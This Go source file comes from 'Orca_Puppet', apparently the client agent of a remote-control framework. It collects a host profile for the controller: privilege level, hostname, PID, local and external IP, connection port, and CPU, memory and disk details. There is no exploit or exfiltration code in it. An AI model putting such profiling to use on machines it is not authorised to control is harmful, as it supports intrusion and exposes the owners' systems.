package infoopt

import (
	"Orca_Puppet/cli/cmdopt/listopt"
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/config"
	"Orca_Puppet/tools/util"
	"fmt"
	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/disk"
	"github.com/shirou/gopsutil/host"
	"github.com/shirou/gopsutil/mem"
	"io/ioutil"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"time"
)

type Info struct {
	ClientInfo ClientInfo
	SystemInfo SystemInfo
}

type ClientInfo struct {
	ExecPath   string
	ClientId   string
	Uptime     string
	Privilege  string
	Version    string
	Hostname   string
	CurrentPid string
	OnlineIp   string
	ConnPort   string
	ExternalIp string
	Address    string
}

type SystemInfo struct {
	HostInfo string
	CpuInfo  string
	MemInfo  string
	DiskInfo string
	IfConfig string
}

// 获取服务商外网ip
func getExternalIP() (ip string, err error) {
	resp, err := http.Get("https://myexternalip.com/raw")
	if err != nil {
		return
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}
	ip = string(body)
	return
}
func getMemInfo() string {
	v, _ := mem.VirtualMemory()
	total := float64(v.Total) / 1024 / 1024 / 1024
	available := float64(v.Available) / 1024 / 1024 / 1024
	return fmt.Sprintf("Total: %0.2f GB\nAvailable: %0.2f GB\nUsedPercent:%0.2f%%\n", total, available, v.UsedPercent)
}

func getCpuInfo() string {
	result := ""
	infos, _ := cpu.Info()
	for _, info := range infos {
		core := info.Cores
		modelName := info.ModelName
		result += fmt.Sprintf("Model: %s\nCore: %d\n", modelName, core)
	}
	return result
}

func getDiskInfo() string {
	result := ""
	infos, _ := disk.Partitions(false)
	for _, info := range infos {
		device := info.Device
		fstype := info.Fstype
		usage, _ := disk.Usage(device)
		total := float64(usage.Total / 1024 / 1024 / 1024)
		free := float64(usage.Free / 1024 / 1024 / 1024)
		result += fmt.Sprintf("Device: %s\nFileSystem: %s\nTotal: %0.2fGB\nFree: %0.2fGB\n", device, fstype, total, free)
	}
	return result
}

func getHostInfo() string {
	timestamp, _ := host.BootTime()
	t := time.Unix(int64(timestamp), 0)
	bootTime := fmt.Sprint(t.Local().Format("2006-01-02 15:04:05"))
	platform, _, version, _ := host.PlatformInformation()
	result := fmt.Sprintf("BootTime: %s\nPlatform: %s\nVersion: %s\n", bootTime, platform, version)
	return result
}

func GetSystemInfo() SystemInfo {
	ifc, _ := ifconfig()
	systeminfo := SystemInfo{
		HostInfo: getHostInfo(),
		CpuInfo:  getCpuInfo(),
		MemInfo:  getMemInfo(),
		DiskInfo: getDiskInfo(),
		IfConfig: ifc,
	}
	return systeminfo
}

func GetClientInfo() ClientInfo {
	var sysType = runtime.GOOS
	var sysArch = runtime.GOARCH
	currentPid := strconv.Itoa(os.Getpid())
	onlineIp, err := listopt.GetIP()
	if err != nil {
		onlineIp = ""
	}
	connPort, _ := listopt.GetConnPort()
	externelIp, _ := getExternalIP()
	execPath, _ := util.GetExecPath()
	clientInfo := ClientInfo{
		ExecPath:   execPath,
		ClientId:   common.ClientId,
		Uptime:     common.Uptime,
		Privilege:  listopt.GetExecPrivilege(),
		Version:    fmt.Sprintf("%s:%s:%s", sysType, config.Version, sysArch),
		Hostname:   listopt.GetHostName(),
		CurrentPid: currentPid,
		OnlineIp:   onlineIp,
		ConnPort:   connPort,
		ExternalIp: externelIp,
		Address:    "",
	}
	return clientInfo
}

func GetInfo() Info {
	info := Info{
		ClientInfo: GetClientInfo(),
		SystemInfo: GetSystemInfo(),
	}
	return info
}
